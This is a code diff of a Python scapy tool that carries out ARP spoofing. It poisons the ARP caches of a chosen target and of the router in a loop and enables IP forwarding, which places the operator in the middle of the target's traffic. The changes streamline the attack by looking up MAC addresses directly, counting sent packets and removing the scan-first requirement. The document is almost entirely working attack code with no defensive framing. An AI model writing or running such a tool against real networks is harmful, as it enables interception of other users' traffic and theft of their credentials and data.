@@ -35,7 +35,7 @@ class color:
    M = '\033[1;35;32m' # magenta
 
 
-targetIp_list = []  
+# targetIp_list = []  
 
 
 def Scan(ip):
@@ -50,18 +50,17 @@ def Print(answered_list):
 	hostlist = 0
 	for element in answered_list:
 		print(" |" + str(hostlist) +"|  " + element[1].psrc +"\t\t" + element[1].hwsrc)
-		client_dict = {"ip":element[1].psrc ,"mac" : element[1].hwsrc}
-		targetIp_list.append(client_dict)
+		# client_dict = {"ip":element[1].psrc ,"mac" : element[1].hwsrc}
+		# targetIp_list.append(client_dict)
 		hostlist +=1
 
 def GetMac(ip):
 	ModAnswer = Scan(ip)
 	return ModAnswer[0][1].hwsrc
 
-def Arp(targetIp,routerIP):
-	targetMac = GetMac(targetIp)
+def Arp(targetIp,targetMac,routerIP):
 	packet = scapy.ARP(op=2,pdst=targetIp,hwdst=targetMac,psrc=routerIP)
-	scapy.send(packet)
+	scapy.send(packet,verbose=False)
 
 def Ipforward():
 	ipf = open('/proc/sys/net/ipv4/ip_forward','r+')
@@ -71,20 +70,26 @@ def Ipforward():
 	else:
 		ipf.close()
 
-
 def Spoof():
-	targetNo = int(input(color.DARKCYAN + "Enter target No :"))
-	targetIp = targetIp_list[targetNo]["ip"]
-	targetMac = targetIp_list[targetNo]["mac"] 
+	targetIp = input(color.DARKCYAN + "Enter target ip :")
+	# targetIp = targetIp_list[targetNo]["ip"]
+	targetMac = GetMac(targetIp)
 	routerIP = input(color.P + "Enter the router Ip :")
+	routerMac = GetMac(routerIP)
 	Ipforward()
-	while True:
-		Arp(targetIp,routerIP)
-		Arp(routerIP,targetIp)
-		sleep(2)
+	print(color.P + "\n[!] Exit the program CTRL + c")
+	send_packet_count = 0
+	try:
+		while True:
+			Arp(targetIp,targetMac,routerIP)
+			Arp(routerIP,routerMac,targetIp)
+			send_packet_count += 2
+			print(color.BLUE + "\r[+] Packet Send :" + str(send_packet_count),end="")
+			sys.stdout.flush()
+			sleep(2)
+	except KeyboardInterrupt:
+		print(color.P + "\n[!] ARP Request is stoped")
 	
-
-
 def main():
 	if os.geteuid() != 0:
 		sys.exit(Back.RED + color.G + "\n[!] Please run as root" + Back.RESET)
@@ -107,10 +112,11 @@ def main():
 			network_ip = input(color.BLUE + "\nEnter the Network address (exmple: 192.168.0.1/24) :")
 			Print(Scan(network_ip))
 		elif choices ==2:
-			if len(targetIp_list) < 1:
-				print( Style.NORMAL + '' + color.RED + "\n\t[ Places make a scan your Network First,Choices 1 option first ] \n\n")
-			else:
-				Spoof()
+			Spoof()
+			# if len(targetIp_list) < 1:
+			# 	print( Style.NORMAL + '' + color.RED + "\n\t[ Places make a scan your Network First,Choices 1 option first ] \n\n")
+			# else:
+			# 	Spoof()
 		elif choices ==3:
 			exit()
 
